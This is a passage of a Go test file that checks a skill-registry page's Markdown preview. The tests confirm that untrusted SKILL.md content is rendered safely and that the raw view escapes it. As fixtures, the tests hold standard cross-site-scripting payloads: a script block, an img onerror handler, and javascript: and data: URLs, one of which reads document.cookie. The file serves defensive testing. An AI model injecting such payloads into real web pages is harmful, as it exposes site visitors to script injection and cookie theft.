	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/uncarded", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Skill Card") {
		t.Errorf("expected the Skill Card section to still render (the static license line always shows), body: %s", body)
	}
	if !strings.Contains(body, "check the skill's own repository for license details") {
		t.Errorf("expected the static license/terms notice to always appear, body: %s", body)
	}
	if strings.Contains(body, "Owner:") {
		t.Errorf("expected no Owner row when unset, body: %s", body)
	}
	if strings.Contains(body, "Risks and mitigations:") {
		t.Errorf("expected no Risks row when unset, body: %s", body)
	}
}

// seedPublishedSkillWithMD publishes a skill under skillID whose SKILL.md
// body (after valid frontmatter) is exactly md -- used by the "raw"/"preview"
// toggle tests below, which need full control over the SKILL.md body's
// Markdown content rather than the fixed fixtures skillMDFor/testValidSkillMD
// provide.
func seedPublishedSkillWithMD(t *testing.T, apiHandler *api.Handler, skillID, md string) {
	t.Helper()
	ctx := context.Background()
	archiveBytes := buildZip(t, map[string]string{"SKILL.md": md})
	if err := os.WriteFile(filepath.Join(apiHandler.PublishedDir, skillID+".zip"), archiveBytes, 0o644); err != nil {
		t.Fatalf("seed published archive: %v", err)
	}
	if _, err := apiHandler.Store.CreateSkillVersion(ctx, store.SkillVersion{
		SkillID: skillID, Version: 1, SubmissionID: "seed-" + skillID, DisplayName: skillID,
		Description: "preview toggle test fixture", GitHubPath: skillID + "/", PublishedAt: time.Now(),
		Status: store.SkillVersionPublished,
	}); err != nil {
		t.Fatalf("seed skill version: %v", err)
	}
	if err := apiHandler.Store.SetSkillPointer(ctx, skillID, 1, time.Now()); err != nil {
		t.Fatalf("seed skill pointer: %v", err)
	}
}

// skillMDWithBody builds a minimal, valid SKILL.md (matching skillMDFor's
// frontmatter shape) whose body is exactly body -- used to control the
// preview-rendered Markdown precisely instead of the fixed body
// skillMDFor's own template hardcodes.
func skillMDWithBody(skillID, body string) string {
	return "---\nname: " + skillID + "\ndescription: Test skill " + skillID + ".\n---\n\n" + body
}

// TestSkillDetail_PreviewView_DropsRawScriptBlock is the first of several
// tests proving the "preview" view (?view=preview) can safely render
// untrusted, third-party-submitted SKILL.md content: a literal <script>
// block in the Markdown source must never reach the response as a live,
// executable <script> tag. This is the actual security property this
// feature depends on, not just that goldmark "works" -- see
// internal/web/markdown.go's renderMarkdownPreview for the mechanism
// (goldmark's default of dropping raw HTML, confirmed by reading goldmark's
// own source, not assumed).
func TestSkillDetail_PreviewView_DropsRawScriptBlock(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "xss-script",
		skillMDWithBody("xss-script", "<script>alert(1)</script>\n\nSome text after.\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/xss-script?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, "<script>") {
		t.Errorf("expected no live <script> tag in the preview response, body: %s", body)
	}
	if !strings.Contains(body, "Some text after.") {
		t.Errorf("expected the rest of the Markdown to still render, body: %s", body)
	}
}

// TestSkillDetail_PreviewView_NeutralizesInlineEventHandler confirms an
// inline raw HTML tag carrying a JS event handler (no <script> element at
// all) is likewise neutralized -- goldmark drops raw inline HTML the same
// way it drops raw HTML blocks, by default, without WithUnsafe().
func TestSkillDetail_PreviewView_NeutralizesInlineEventHandler(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "xss-imgevent",
		skillMDWithBody("xss-imgevent", `before <img src=x onerror="alert(1)"> after`+"\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/xss-imgevent?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, "onerror") {
		t.Errorf("expected onerror to never reach the response, body: %s", body)
	}
	if strings.Contains(body, "<img src=x") {
		t.Errorf("expected the raw <img> tag to never reach the response unneutralized, body: %s", body)
	}
}

// TestSkillDetail_PreviewView_NeutralizesJavascriptLink confirms a
// perfectly ordinary CommonMark link -- [text](url), no raw HTML involved
// -- whose URL is a javascript: scheme is still neutralized: the URL
// allowlist in internal/web/markdown.go, not just goldmark's own dropping
// of raw HTML, is what has to catch this case.
func TestSkillDetail_PreviewView_NeutralizesJavascriptLink(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "xss-link",
		skillMDWithBody("xss-link", "[click me](javascript:alert(document.cookie))\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/xss-link?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, "javascript:") {
		t.Errorf("expected no javascript: URL anywhere in the response, body: %s", body)
	}
	if !strings.Contains(body, "click me") {
		t.Errorf("expected the link's visible text to still render, body: %s", body)
	}
}

// TestSkillDetail_PreviewView_NeutralizesDangerousImageURL is the image
// counterpart of the javascript: link test above, covering both a
// javascript: and a data: image URL -- CommonMark's ![alt](url) syntax,
// no raw HTML.
func TestSkillDetail_PreviewView_NeutralizesDangerousImageURL(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "xss-image",
		skillMDWithBody("xss-image",
			"![js](javascript:alert(1))\n\n![data](data:text/html,<script>alert(1)</script>)\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/xss-image?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, "javascript:") {
		t.Errorf("expected no javascript: URL anywhere in the response, body: %s", body)
	}
	if strings.Contains(body, "data:text/html") {
		t.Errorf("expected no data: URL anywhere in the response, body: %s", body)
	}
	if strings.Contains(body, "<script>") {
		t.Errorf("expected no live <script> tag smuggled in via a data: URL, body: %s", body)
	}
}

// TestSkillDetail_PreviewView_RendersLegitimateMarkdown is the "prove the
// feature actually works, not just that it's maximally defensive" half of
// this test suite: an ordinary, harmless SKILL.md body -- a heading, a
// list, a fenced code block, and a real https:// link -- must render as
// real HTML in preview mode, not just survive without an XSS payload.
func TestSkillDetail_PreviewView_RendersLegitimateMarkdown(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "legit-preview", skillMDWithBody("legit-preview",
		"## Usage\n\n- step one\n- step two\n\n```bash\necho hi\n```\n\nSee [the docs](https://example.com/docs).\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/legit-preview?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	for _, want := range []string{
		"<h2>Usage</h2>", "<li>step one</li>", "<pre><code", `<a href="https://example.com/docs">`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("expected preview HTML to contain %q, body: %s", want, body)
		}
	}
}

// TestSkillDetail_RawViewUnaffectedByPreviewFeature confirms both the
// explicit ?view=raw view and the no-?view-at-all default are completely
// unaffected by any of the above: still the exact plain-escaped-text <pre>
// block this page has always rendered, even for a body containing exactly
// the same payloads exercised above -- the "preview" feature is opt-in, and
// getting the default wrong would defeat that entirely.
func TestSkillDetail_RawViewUnaffectedByPreviewFeature(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	payloadMD := skillMDWithBody("raw-unaffected", "<script>alert(1)</script>\n\n[x](javascript:alert(1))\n")
	seedPublishedSkillWithMD(t, apiHandler, "raw-unaffected", payloadMD)

	for _, path := range []string{"/skills/raw-unaffected", "/skills/raw-unaffected?view=raw", "/skills/raw-unaffected?view=garbage"} {
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, path, nil))
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status = %d, want 200, body: %s", path, rec.Code, rec.Body.String())
		}
		body := rec.Body.String()
		// html/template's default auto-escaping renders the literal
		// "<script>" as "&lt;script&gt;" inside the <pre> block -- exactly
		// the same as before this feature existed.
		if strings.Contains(body, "<script>alert(1)</script>") {
			t.Errorf("%s: expected the raw view to auto-escape the payload, not pass it through, body: %s", path, body)
		}
		if !strings.Contains(body, "&lt;script&gt;alert(1)&lt;/script&gt;") {
			t.Errorf("%s: expected the escaped payload text inside the <pre> block, body: %s", path, body)
		}
		if !strings.Contains(body, "<pre>") {
			t.Errorf("%s: expected the plain <pre> block, body: %s", path, body)
		}
	}
}

// TestSkillDetail_PreviewView_StripsFrontmatterBeforeRendering confirms the
// leading YAML frontmatter block never reaches goldmark: CommonMark has no
// concept of it, so without stripFrontmatter the "---" delimiters parse as
// a thematic break followed by a Setext heading, dumping the raw
// "name: .../description: ..." lines into a stray <h2>. This is a
// rendering-quality assertion, not a security one -- see
// stripFrontmatter's doc comment in internal/web/markdown.go.
func TestSkillDetail_PreviewView_StripsFrontmatterBeforeRendering(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "fm-strip",
		skillMDWithBody("fm-strip", "# Real Heading\n\nReal body text.\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/fm-strip?view=preview", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if strings.Contains(body, "description: Test skill") {
		t.Errorf("expected the frontmatter's description line to be stripped, not rendered, body: %s", body)
	}
	if !strings.Contains(body, "<h1>Real Heading</h1>") {
		t.Errorf("expected the real body heading to render as <h1>, body: %s", body)
	}
}

// TestSkillDetail_ToggleLinksPointAtTheOtherView confirms the "raw|preview"
// toggle actually lets a visitor switch views: whichever view is currently
// active renders as inert text (not a link -- clicking it would be a
// no-op), and the *other* view renders as a real link to switch to it. A
// prior version of this template had the two branches swapped, so both
// links pointed at the view already being shown and neither ever let a
// visitor reach the other view.
func TestSkillDetail_ToggleLinksPointAtTheOtherView(t *testing.T) {
	h, apiHandler, _ := testHandler(t)
	mux := newMux(h)
	seedPublishedSkillWithMD(t, apiHandler, "toggle-links", skillMDWithBody("toggle-links", "Body.\n"))

	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/toggle-links", nil))
	body := rec.Body.String()
	if !strings.Contains(body, "<span>raw</span>") {
		t.Errorf("raw view: expected \"raw\" to render as inert (already active), body: %s", body)
	}
	if !strings.Contains(body, `<a href="?view=preview">preview</a>`) {
		t.Errorf("raw view: expected a real link to switch to preview, body: %s", body)
	}

	rec = httptest.NewRecorder()
	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/skills/toggle-links?view=preview", nil))
	body = rec.Body.String()
	if !strings.Contains(body, `<a href="?view=raw">raw</a>`) {
		t.Errorf("preview view: expected a real link to switch back to raw, body: %s", body)
	}
	if !strings.Contains(body, "<span>preview</span>") {
		t.Errorf("preview view: expected \"preview\" to render as inert (already active), body: %s", body)
	}
}
